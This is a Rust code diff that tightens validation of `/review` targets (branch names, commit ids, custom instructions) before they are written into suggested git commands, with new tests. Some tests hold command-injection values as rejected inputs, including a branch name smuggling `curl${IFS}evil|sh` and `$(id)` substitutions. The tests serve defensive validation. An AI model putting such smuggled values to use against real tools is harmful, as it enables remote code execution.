@@ -27,23 +27,28 @@ pub(crate) enum SessionAction {
 /// What a review covers, as Codex's `review/start` names its targets.
 pub(crate) enum ReviewTarget {
     UncommittedChanges {},
-    BaseBranch { branch: Word<256> },
-    Commit { sha: Word<64> },
-    Custom { instructions: RequiredText<16384> },
+    BaseBranch { branch: Branch },
+    Commit { sha: Sha },
+    Custom { instructions: Instructions },
 }
 
-/// One word of a `/review` command: a branch name or a commit. It has no
-/// whitespace or control characters and cannot read as an option.
+/// A branch a `/review` names, in the characters git ref names commonly
+/// use. Codex writes it into git commands it suggests to the model, so it
+/// carries no quoting or shell syntax, and it cannot read as an option or
+/// a range.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 #[serde(transparent)]
-pub(crate) struct Word<const MAX: usize>(String);
+pub(crate) struct Branch(String);
 
-impl<const MAX: usize> Word<MAX> {
+impl Branch {
     pub(crate) fn new(value: &str) -> Option<Self> {
         (!value.is_empty()
-            && value.len() <= MAX
-            && !value.starts_with('-')
-            && !value.chars().any(|c| c.is_whitespace() || c.is_control()))
+            && value.len() <= 256
+            && !value.starts_with(['-', '.', '/'])
+            && !value.contains("..")
+            && value
+                .bytes()
+                .all(|b| b.is_ascii_alphanumeric() || b"._/@+-".contains(&b)))
         .then(|| Self(value.to_owned()))
     }
     pub(crate) fn as_str(&self) -> &str {
@@ -51,10 +56,59 @@ impl<const MAX: usize> Word<MAX> {
     }
 }
 
-impl<'de, const MAX: usize> Deserialize<'de> for Word<MAX> {
-    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
-        let value = String::deserialize(deserializer)?;
-        Self::new(&value).ok_or_else(|| serde::de::Error::custom("not one word"))
+/// A commit a `/review` names: an abbreviated or full hex object id.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+#[serde(transparent)]
+pub(crate) struct Sha(String);
+
+impl Sha {
+    pub(crate) fn new(value: &str) -> Option<Self> {
+        ((4..=64).contains(&value.len()) && value.bytes().all(|b| b.is_ascii_hexdigit()))
+            .then(|| Self(value.to_owned()))
+    }
+    pub(crate) fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
+/// What a custom review looks for, as `/review <instructions>` reads back:
+/// trimmed, and not in the form that names a branch or commit.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+#[serde(transparent)]
+pub(crate) struct Instructions(RequiredText<16384>);
+
+impl Instructions {
+    pub(crate) fn new(value: &str) -> Option<Self> {
+        if value.trim() != value || named_target(value).is_some() {
+            return None;
+        }
+        RequiredText::new("instructions", value).ok().map(Self)
+    }
+    pub(crate) fn as_str(&self) -> &str {
+        self.0.as_str()
+    }
+}
+
+macro_rules! deserialize_checked {
+    ($($name:ident: $what:literal),*) => {$(
+        impl<'de> Deserialize<'de> for $name {
+            fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+                let value = String::deserialize(deserializer)?;
+                Self::new(&value).ok_or_else(|| serde::de::Error::custom($what))
+            }
+        }
+    )*};
+}
+deserialize_checked!(Branch: "not a branch name", Sha: "not a commit id",
+    Instructions: "not review instructions");
+
+/// The branch or commit `/review base <branch>` or `/review commit <sha>`
+/// names.
+fn named_target(input: &str) -> Option<ReviewTarget> {
+    match input.split_whitespace().collect::<Vec<_>>().as_slice() {
+        ["base", branch] => Branch::new(branch).map(|branch| ReviewTarget::BaseBranch { branch }),
+        ["commit", sha] => Sha::new(sha).map(|sha| ReviewTarget::Commit { sha }),
+        _ => None,
     }
 }
 
@@ -96,27 +150,14 @@ impl SessionAction {
             ("review", None) => Some(Self::Review {
                 target: ReviewTarget::UncommittedChanges {},
             }),
-            ("review", Some(input)) => {
-                let words: Vec<&str> = input.split_whitespace().collect();
-                let target = match words.as_slice() {
-                    ["base", branch] => {
-                        Word::new(branch).map(|branch| ReviewTarget::BaseBranch { branch })
-                    }
-                    ["commit", sha]
-                        if sha.len() >= 4 && sha.chars().all(|c| c.is_ascii_hexdigit()) =>
-                    {
-                        Word::new(sha).map(|sha| ReviewTarget::Commit { sha })
-                    }
-                    _ => None,
-                };
-                let target = match target {
+            ("review", Some(input)) => Some(Self::Review {
+                target: match named_target(input) {
                     Some(target) => target,
                     None => ReviewTarget::Custom {
-                        instructions: RequiredText::new("instructions", input).ok()?,
+                        instructions: Instructions::new(input)?,
                     },
-                };
-                Some(Self::Review { target })
-            }
+                },
+            }),
             _ => None,
         }
     }
@@ -144,6 +185,15 @@ mod tests {
             json!({"kind":"review","target":{"kind":"baseBranch","branch":"two words"}}),
             json!({"kind":"review","target":{"kind":"baseBranch","branch":"--force"}}),
             json!({"kind":"review","target":{"kind":"commit","sha":""}}),
+            json!({"kind":"review","target":{"kind":"commit","sha":"HEAD~1"}}),
+            json!({"kind":"review","target":{"kind":"commit","sha":"$(id)"}}),
+            json!({"kind":"review","target":{"kind":"baseBranch","branch":"x\";curl${IFS}evil|sh;\""}}),
+            json!({"kind":"review","target":{"kind":"baseBranch","branch":"main..topic"}}),
+            json!({"kind":"review","target":{"kind":"baseBranch","branch":"main@{upstream}"}}),
+            // Instructions a `/review` would read back as another target.
+            json!({"kind":"review","target":{"kind":"custom","instructions":"base main"}}),
+            json!({"kind":"review","target":{"kind":"custom","instructions":"commit  abcd"}}),
+            json!({"kind":"review","target":{"kind":"custom","instructions":" padded"}}),
             json!({"kind":"review","target":{"kind":"custom","instructions":""}}),
             json!({"kind":"review"}),
             json!({"kind":"review","target":{"kind":"uncommittedChanges","extra":1}}),
@@ -188,6 +238,16 @@ mod tests {
                 "review",
                 Some("base --force"),
                 json!({"kind":"review","target":{"kind":"custom","instructions":"base --force"}}),
+            ),
+            (
+                "review",
+                Some("base $(id)"),
+                json!({"kind":"review","target":{"kind":"custom","instructions":"base $(id)"}}),
+            ),
+            (
+                "review",
+                Some("base feature/x-1.2"),
+                json!({"kind":"review","target":{"kind":"baseBranch","branch":"feature/x-1.2"}}),
             ),
             (
                 "review",
